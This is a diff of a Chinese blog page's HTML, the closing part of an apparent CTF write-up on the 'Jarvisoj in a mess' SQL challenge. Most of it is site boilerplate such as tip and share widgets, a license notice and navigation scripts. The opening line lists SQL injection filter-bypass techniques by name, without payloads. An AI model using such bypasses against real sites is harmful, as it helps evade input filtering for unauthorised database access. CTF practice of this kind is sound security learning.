+<p>两个空格代替一个空格,用Tab代替空格<br>括号绕过<br>引号绕过<br>逗号绕过<br>比较符号<br>or and xor not绕过<br>绕过注释符号<br>=绕过<br>绕过union，select，where等<br>通用绕过（编码）<br>等价函数绕过<br>宽字节注入</p>
+</blockquote>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
+            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
+                  property="dct:title" rel="dct:type">
+                    《Jarvisoj- in a mess(SQL)》
+                </span> 由
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/31/jarvisoj-in-a-mess-sql/" property="cc:attributionName"
+               rel="cc:attributionURL">
+                XIao Ming
+            </a> 采用
+            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
+                知识共享署名 4.0 国际许可协议
+            </a>进行许可。
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2019/07/31/jarvisoj-in-a-mess-sql/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Jarvisoj- in a mess(SQL)">
+                        
+                        <span class="card-title">Jarvisoj- in a mess(SQL)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Jarvisoj Web In a mess(500) writeup过检测由源代码提示
+&lt;!--index.phps--&gt;work harder!harder!harder!http://web.jarvisoj.com:32
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web/" class="post-category" target="_blank">
+                                    web
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/" target="_blank">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/07/31/an-zhuo-ni-xiang-xue-xi-bi-ji-yi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="安卓逆向学习笔记（一）">
+                        
+                        <span class="card-title">安卓逆向学习笔记（一）</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            安卓逆向学习笔记（一）APK文件结构assets                    表示资源文件
+lib                        表示库文件
+META-INF                表示签名文件夹
+    
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Android/" class="post-category" target="_blank">
+                                    Android
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Android/" target="_blank">
+                        <span class="chip bg-color">Android</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">2.9k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:670043885@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=670043885" class="tooltipped" data-tooltip="QQ联系我: 670043885" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+{% if theme.mermaid.enable %}
+  <script src='https://unpkg.com/mermaid@{{ theme.mermaid.version }}/dist/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({{ JSON.stringify(theme.mermaid.options) }});
+    }
+  </script>
+{% endif %}
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+    <script src="/libs/others/clicklove.js"></script>
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":300,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
